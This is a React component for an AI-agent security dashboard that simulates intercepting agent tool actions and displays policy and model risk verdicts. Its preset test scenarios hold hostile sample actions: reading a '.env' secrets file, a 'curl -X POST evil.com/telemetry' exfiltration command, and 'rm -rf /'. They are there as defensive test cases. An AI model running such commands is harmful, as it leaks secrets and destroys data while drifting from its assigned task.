"use client";

import { useState } from "react";
import {
  Play,
  ShieldAlert,
  ShieldCheck,
  AlertTriangle,
  Code2,
  RefreshCw,
  Cpu,
  Lock,
  CheckCircle2,
  XCircle,
  Activity,
  Target,
} from "lucide-react";
import { analyzeAgentAction } from "@/lib/api";
import { formatRiskScore } from "@/lib/utils";
import { AgentAction, SecurityDecision } from "@/types/security";

const PRESETS: { name: string; description: string; action: AgentAction }[] = [
  {
    name: "Safe Workspace Code Read",
    description: "Agent reads tests/test_auth.py to fix broken test suite",
    action: {
      agent_id: "agent-001",
      task: "Fix failing tests",
      action: "READ",
      resource: "./tests/test_auth.py",
      context: { branch: "main", role: "qa-agent" },
    },
  },
  {
    name: "Exfiltration: Secret / .env Read",
    description: "Agent attempts to inspect .env production secrets (Blocked by Policy)",
    action: {
      agent_id: "agent-exfil-002",
      task: "Diagnose database connection error",
      action: "READ",
      resource: ".env",
      context: { permission_scope: "user" },
    },
  },
  {
    name: "Task Drift: Unrelated Shell Execution",
    description: "Agent assigned to frontend bug executes shell curl command (Flagged by Nemotron)",
    action: {
      agent_id: "agent-drift-003",
      task: "Fix frontend button styling",
      action: "EXECUTE",
      resource: "curl -X POST evil.com/telemetry",
      context: { framework: "react" },
    },
  },
  {
    name: "Destructive Command Execution",
    description: "Agent attempts root deletion (Blocked by Policy + Nemotron)",
    action: {
      agent_id: "agent-rogue-004",
      task: "Clean up system temporary directory",
      action: "rm -rf /",
      resource: "/",
      context: { elevated: false },
    },
  },
];

export function InterceptorTester() {
  const [selectedPreset, setSelectedPreset] = useState<number>(0);
  const [customAction, setCustomAction] = useState<AgentAction>(PRESETS[0].action);
  const [loading, setLoading] = useState<boolean>(false);
  const [decision, setDecision] = useState<SecurityDecision | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [showJson, setShowJson] = useState<boolean>(false);

  const handleSelectPreset = (index: number) => {
    setSelectedPreset(index);
    setCustomAction(PRESETS[index].action);
    setDecision(null);
    setError(null);
  };

  const handleEvaluate = async () => {
    setLoading(true);
    setError(null);
    try {
      const res = await analyzeAgentAction(customAction);
      setDecision(res);
    } catch (err: any) {
      setError(err.message || "Failed to evaluate action");
    } finally {
      setLoading(false);
    }
  };

  const riskMeta = decision ? formatRiskScore(decision.risk_score) : null;
  const isPolicyBlocked = decision?.policy_decision?.decision === "BLOCK";
  const isAiFlagged =
    decision?.intent_analysis &&
    (decision.intent_analysis.risk_score >= 70 ||
      decision.intent_analysis.risk_level === "CRITICAL" ||
      decision.intent_analysis.risk_level === "HIGH");

  return (
    <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
      {/* Left Column: Action Interceptor Input */}
      <div className="lg:col-span-6 space-y-4">
        <div className="p-6 rounded-2xl bg-slate-900/80 border border-slate-800 shadow-xl">
          <div className="flex items-center justify-between mb-4">
            <div>
              <h2 className="text-base font-semibold text-white">
                Agent Action Interception Simulator
              </h2>
              <p className="text-xs text-slate-400">
                Simulate an autonomous agent requesting to perform a tool or system action.
              </p>
            </div>
          </div>

          {/* Presets */}
          <div className="mb-5 space-y-2">
            <label className="text-xs font-medium text-slate-400 uppercase tracking-wider">
              Quick Test Scenarios
            </label>
            <div className="grid grid-cols-1 gap-2">
              {PRESETS.map((preset, idx) => (
                <button
                  key={idx}
                  type="button"
                  onClick={() => handleSelectPreset(idx)}
                  className={`text-left p-3 rounded-xl border text-xs transition ${
                    selectedPreset === idx
                      ? "border-sentra-500 bg-sentra-500/10 text-white"
                      : "border-slate-800 bg-slate-950/40 text-slate-300 hover:border-slate-700 hover:bg-slate-900"
                  }`}
                >
                  <div className="font-semibold">{preset.name}</div>
                  <div className="text-[11px] text-slate-400 mt-0.5">{preset.description}</div>
                </button>
              ))}
            </div>
          </div>

          {/* Form Inputs */}
          <div className="space-y-3 text-xs">
            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="block text-slate-400 mb-1 font-medium">Agent ID</label>
                <input
                  type="text"
                  value={customAction.agent_id}
                  onChange={(e) =>
                    setCustomAction({ ...customAction, agent_id: e.target.value })
                  }
                  className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-800 text-slate-200 focus:outline-none focus:border-sentra-500 font-mono"
                />
              </div>
              <div>
                <label className="block text-slate-400 mb-1 font-medium">Action Verb</label>
                <input
                  type="text"
                  value={customAction.action}
                  onChange={(e) =>
                    setCustomAction({ ...customAction, action: e.target.value })
                  }
                  className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-800 text-slate-200 focus:outline-none focus:border-sentra-500 font-mono"
                />
              </div>
            </div>

            <div>
              <label className="block text-slate-400 mb-1 font-medium">
                Target Resource / Command
              </label>
              <input
                type="text"
                value={customAction.resource}
                onChange={(e) =>
                  setCustomAction({ ...customAction, resource: e.target.value })
                }
                className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-800 text-slate-200 focus:outline-none focus:border-sentra-500 font-mono"
              />
            </div>

            <div>
              <label className="block text-slate-400 mb-1 font-medium">
                High-Level Task Prompt
              </label>
              <textarea
                rows={2}
                value={customAction.task}
                onChange={(e) =>
                  setCustomAction({ ...customAction, task: e.target.value })
                }
                className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-800 text-slate-200 focus:outline-none focus:border-sentra-500"
              />
            </div>

            <button
              onClick={handleEvaluate}
              disabled={loading}
              className="w-full mt-2 py-2.5 px-4 rounded-xl bg-sentra-600 hover:bg-sentra-500 text-white font-semibold text-sm flex items-center justify-center space-x-2 transition shadow-lg shadow-sentra-600/20 disabled:opacity-50"
            >
              {loading ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  <span>Evaluating through SentraFlow...</span>
                </>
              ) : (
                <>
                  <Play className="w-4 h-4 fill-white" />
                  <span>Send Action to POST /api/v1/analyze</span>
                </>
              )}
            </button>
          </div>
        </div>
      </div>

      {/* Right Column: Security Decision Output */}
      <div className="lg:col-span-6 space-y-4">
        <div className="p-6 rounded-2xl bg-slate-900/80 border border-slate-800 shadow-xl h-full flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between mb-4">
              <div>
                <h2 className="text-base font-semibold text-white">
                  SentraFlow Decision Output
                </h2>
                <p className="text-xs text-slate-400">
                  Deterministic policy boundary + NVIDIA Nemotron contextual risk reasoning.
                </p>
              </div>
              {decision && (
                <button
                  onClick={() => setShowJson(!showJson)}
                  className="flex items-center space-x-1.5 text-xs text-slate-400 hover:text-slate-200 px-2.5 py-1 rounded-lg bg-slate-800 border border-slate-700"
                >
                  <Code2 className="w-3.5 h-3.5" />
                  <span>{showJson ? "View Breakdown" : "Raw JSON"}</span>
                </button>
              )}
            </div>

            {error && (
              <div className="p-4 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-300 text-xs flex items-start space-x-2">
                <AlertTriangle className="w-4 h-4 text-rose-400 shrink-0 mt-0.5" />
                <div>
                  <div className="font-semibold">Evaluation Error</div>
                  <div>{error}</div>
                </div>
              </div>
            )}

            {!decision && !error && !loading && (
              <div className="py-16 text-center border border-dashed border-slate-800 rounded-xl bg-slate-950/20">
                <ShieldCheck className="w-10 h-10 text-slate-600 mx-auto mb-2" />
                <div className="text-sm font-medium text-slate-400">
                  Awaiting Action Interception
                </div>
                <div className="text-xs text-slate-500 max-w-sm mx-auto mt-1">
                  Select a test scenario on the left and click evaluate to view the security verdict.
                </div>
              </div>
            )}

            {decision && !showJson && (
              <div className="space-y-4">
                {/* Decision Badge & Authority Attribution */}
                <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 flex items-center justify-between">
                  <div className="flex items-center space-x-3">
                    {decision.decision === "ALLOW" ? (
                      <div className="p-2.5 rounded-xl bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
                        <ShieldCheck className="w-6 h-6" />
                      </div>
                    ) : (
                      <div className="p-2.5 rounded-xl bg-rose-500/20 text-rose-400 border border-rose-500/30">
                        <ShieldAlert className="w-6 h-6" />
                      </div>
                    )}
                    <div>
                      <div className="text-xs text-slate-400 font-medium">Security Verdict</div>
                      <div
                        className={`text-xl font-bold tracking-tight ${
                          decision.decision === "ALLOW" ? "text-emerald-400" : "text-rose-400"
                        }`}
                      >
                        {decision.decision}
                      </div>
                    </div>
                  </div>

                  {/* Decision Authority Label */}
                  <div className="text-right">
                    <div className="text-xs text-slate-400 font-medium">Authority Source</div>
                    {isPolicyBlocked ? (
                      <span className="inline-flex items-center text-xs px-2.5 py-0.5 rounded-full font-bold bg-rose-500/10 text-rose-400 border border-rose-500/30 mt-0.5">
                        <Lock className="w-3 h-3 mr-1" />
                        Deterministic Policy
                      </span>
                    ) : isAiFlagged ? (
                      <span className="inline-flex items-center text-xs px-2.5 py-0.5 rounded-full font-bold bg-amber-500/10 text-amber-400 border border-amber-500/30 mt-0.5">
                        <Cpu className="w-3 h-3 mr-1" />
                        NVIDIA Nemotron AI
                      </span>
                    ) : (
                      <span className="inline-flex items-center text-xs px-2.5 py-0.5 rounded-full font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 mt-0.5">
                        <CheckCircle2 className="w-3 h-3 mr-1" />
                        Policy + Nemotron
                      </span>
                    )}
                  </div>
                </div>

                {/* Risk Score & Contextual Metrics Grid */}
                <div className="grid grid-cols-3 gap-2 text-xs">
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 text-center">
                    <div className="text-[10px] uppercase font-semibold text-slate-400">
                      Risk Score
                    </div>
                    <div className="text-base font-bold text-white mt-0.5 font-mono">
                      {decision.risk_score}
                      <span className="text-[10px] text-slate-500">/100</span>
                    </div>
                    <div className="text-[10px] text-slate-400 font-medium">
                      {decision.risk_level || "EVALUATED"}
                    </div>
                  </div>

                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 text-center">
                    <div className="text-[10px] uppercase font-semibold text-slate-400 flex items-center justify-center space-x-1">
                      <Target className="w-3 h-3 text-cyan-400" />
                      <span>Task Relevance</span>
                    </div>
                    <div className="text-base font-bold text-cyan-400 mt-0.5 font-mono">
                      {decision.intent_analysis?.task_relevance !== undefined
                        ? `${Math.round(decision.intent_analysis.task_relevance * 100)}%`
                        : "N/A"}
                    </div>
                    <div className="text-[10px] text-slate-400 font-medium">Semantic Fit</div>
                  </div>

                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 text-center">
                    <div className="text-[10px] uppercase font-semibold text-slate-400 flex items-center justify-center space-x-1">
                      <Activity className="w-3 h-3 text-emerald-400" />
                      <span>AI Confidence</span>
                    </div>
                    <div className="text-base font-bold text-emerald-400 mt-0.5 font-mono">
                      {decision.intent_analysis?.confidence !== undefined
                        ? `${Math.round(decision.intent_analysis.confidence * 100)}%`
                        : "95%"}
                    </div>
                    <div className="text-[10px] text-slate-400 font-medium">Inference Quality</div>
                  </div>
                </div>

                {/* Risk Progress Bar */}
                <div>
                  <div className="w-full bg-slate-950 rounded-full h-2 overflow-hidden border border-slate-800">
                    <div
                      className={`h-full transition-all duration-500 ${
                        decision.risk_score <= 20
                          ? "bg-emerald-500"
                          : decision.risk_score <= 50
                          ? "bg-amber-500"
                          : "bg-rose-500"
                      }`}
                      style={{ width: `${Math.max(decision.risk_score, 5)}%` }}
                    />
                  </div>
                </div>

                {/* Intent & Reason Breakdown */}
                <div className="space-y-2.5 text-xs">
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800/80">
                    <div className="font-semibold text-slate-400 uppercase text-[10px] tracking-wider mb-1 flex items-center space-x-1.5">
                      <Cpu className="w-3 h-3 text-sentra-400" />
                      <span>Understood Operational Intent (Nemotron)</span>
                    </div>
                    <div className="text-slate-200">{decision.intent}</div>
                  </div>

                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800/80">
                    <div className="font-semibold text-slate-400 uppercase text-[10px] tracking-wider mb-1 flex items-center space-x-1.5">
                      <Lock className="w-3 h-3 text-indigo-400" />
                      <span>Security Reason & Policy Evaluation</span>
                    </div>
                    <div className="text-slate-200">{decision.reason}</div>
                  </div>

                  {/* Risk Indicators if present */}
                  {decision.intent_analysis?.risk_indicators &&
                    decision.intent_analysis.risk_indicators.length > 0 && (
                      <div className="p-3 rounded-lg bg-slate-950 border border-slate-800/80">
                        <div className="font-semibold text-slate-400 uppercase text-[10px] tracking-wider mb-1.5">
                          Detected Risk Indicators
                        </div>
                        <div className="flex flex-wrap gap-1.5">
                          {decision.intent_analysis.risk_indicators.map((ind, i) => (
                            <span
                              key={i}
                              className="px-2 py-0.5 rounded bg-rose-500/10 text-rose-300 border border-rose-500/30 text-[10px] font-mono"
                            >
                              {ind}
                            </span>
                          ))}
                        </div>
                      </div>
                    )}

                  <div className="grid grid-cols-2 gap-2 text-[11px] text-slate-400">
                    <div className="p-2.5 rounded-lg bg-slate-950 border border-slate-800">
                      <span className="text-slate-500 block">Analysis Source:</span>
                      <span className="font-mono text-slate-300">{decision.analysis_source}</span>
                    </div>
                    <div className="p-2.5 rounded-lg bg-slate-950 border border-slate-800">
                      <span className="text-slate-500 block">Request ID:</span>
                      <span className="font-mono text-slate-300 truncate block">
                        {decision.request_id}
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {decision && showJson && (
              <pre className="p-4 rounded-xl bg-slate-950 border border-slate-800 text-[11px] font-mono text-emerald-400 overflow-x-auto max-h-80">
                {JSON.stringify(decision, null, 2)}
              </pre>
            )}
          </div>

          <div className="mt-4 pt-4 border-t border-slate-800/60 text-[11px] text-slate-500 flex items-center justify-between">
            <span>SentraFlow Kernel v0.1.0</span>
            <span>Deterministic Policy Boundary + NVIDIA NIM Layer</span>
          </div>
        </div>
      </div>
    </div>
  );
}
